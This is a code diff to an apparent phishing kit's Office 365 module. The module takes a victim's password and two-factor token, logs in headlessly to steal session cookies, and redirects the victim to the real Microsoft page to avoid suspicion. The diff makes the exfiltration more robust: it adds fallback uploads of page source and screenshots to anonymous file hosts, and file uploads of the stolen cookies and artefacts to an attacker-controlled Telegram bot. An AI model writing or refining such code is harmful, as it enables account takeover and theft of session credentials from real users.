@@ -70,19 +70,32 @@ class Office365Module(BaseModule):
 
         def _cookie_worker(user, pwd, token):
             import os  # new: needed for path handling in uploads
-            # helper to push artefacts to transfer.sh anonymously
+            # helper: try multiple anonymous hosting providers, return URL or None
             def _upload(file_path):
-                try:
-                    with open(file_path, 'rb') as fp:
-                        resp = requests.put(
-                            f'https://transfer.sh/{os.path.basename(file_path)}',
-                            data=fp,
-                            timeout=30,
-                        )
-                    if resp.ok:
-                        return resp.text.strip()
-                except Exception as exc:
-                    print(f"[upload] Failed to upload {file_path}: {exc}")
+                providers = [
+                    ('transfer.sh', 'PUT'),
+                    ('0x0.st', 'POST'),
+                ]
+                for host, method in providers:
+                    try:
+                        if method == 'PUT':
+                            with open(file_path, 'rb') as fp:
+                                resp = requests.put(
+                                    f'https://{host}/{os.path.basename(file_path)}',
+                                    data=fp,
+                                    timeout=30,
+                                )
+                        else:  # POST multipart
+                            with open(file_path, 'rb') as fp:
+                                resp = requests.post(
+                                    f'https://{host}',
+                                    files={'file': (os.path.basename(file_path), fp)},
+                                    timeout=30,
+                                )
+                        if resp.ok and resp.text.strip().startswith('http'):
+                            return resp.text.strip()
+                    except Exception as exc:
+                        print(f"[upload] Provider {host} failed for {file_path}: {exc}")
                 return None
 
             try:
@@ -95,6 +108,7 @@ class Office365Module(BaseModule):
 
             # Attempt to upload debug artefacts (page_source / screenshot)
             artefact_links = []
+            doc_paths = []
             if cookies and isinstance(cookies, list) and cookies:
                 first = cookies[0]
                 for key in ("page_source", "screenshot"):
@@ -105,6 +119,9 @@ class Office365Module(BaseModule):
                             artefact_links.append(f"{key}: {url}")
                             # replace local path with URL for clarity
                             first[key] = url
+                        else:
+                            # fall back to Telegram file upload later
+                            doc_paths.append(local_path)
 
             cookie_block = json.dumps(cookies, indent=2) if cookies else 'Cookie capture failed'
             msg = (
@@ -112,24 +129,55 @@ class Office365Module(BaseModule):
             )
             if artefact_links:
                 msg += "\n\nDebug artefacts:\n" + "\n".join(artefact_links)
-            self.send_telegram(msg)
+
+            self.send_telegram(msg, document_paths=doc_paths if doc_paths else None)
 
         threading.Thread(target=_cookie_worker, args=(self.user, self.captured_password, self.two_factor_token), daemon=True).start()
 
         # Give the victim the real Microsoft redirect right away
         return redirect(self.final_url, code=302)
 
-    def send_telegram(self, message):
+    def send_telegram(self, message: str | None = None, document_paths: list | None = None):
+        """Send a Markdown message and/or upload documents to Telegram.
+
+        Parameters
+        ----------
+        message : str | None
+            Text to send. If None, no text message is sent.
+        document_paths : list[str] | None
+            Optional list of file paths to upload as documents (one request per file).
+        """
         bot_token = getenv('TELEGRAM_BOT_TOKEN')
         chat_id = getenv('TELEGRAM_CHAT_ID')
         if not bot_token or not chat_id:
             return
-        url = 'https://api.telegram.org/bot{}/sendMessage'.format(bot_token)
-        payload = {'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
-        try:
-            requests.post(url, json=payload, timeout=10)
-        except Exception:
-            pass
+
+        session_req = requests.Session()
+
+        if message:
+            try:
+                url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
+                payload = {
+                    'chat_id': chat_id,
+                    'text': message,
+                    'parse_mode': 'Markdown',
+                }
+                session_req.post(url, json=payload, timeout=15)
+            except Exception:
+                pass
+
+        if document_paths:
+            for fpath in document_paths:
+                try:
+                    if not os.path.exists(fpath):
+                        continue
+                    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                    with open(fpath, 'rb') as fp:
+                        files = {'document': (os.path.basename(fpath), fp)}
+                        data = {'chat_id': chat_id}
+                        session_req.post(url, data=data, files=files, timeout=30)
+                except Exception as exc:
+                    print(f"[telegram-upload] Failed to send {fpath}: {exc}")
 
     def perform_automated_login(self):
         """Use headless Chrome to login and return cookies list. Handles M-series Mac headless quirks & Stay-signed-in prompt."""
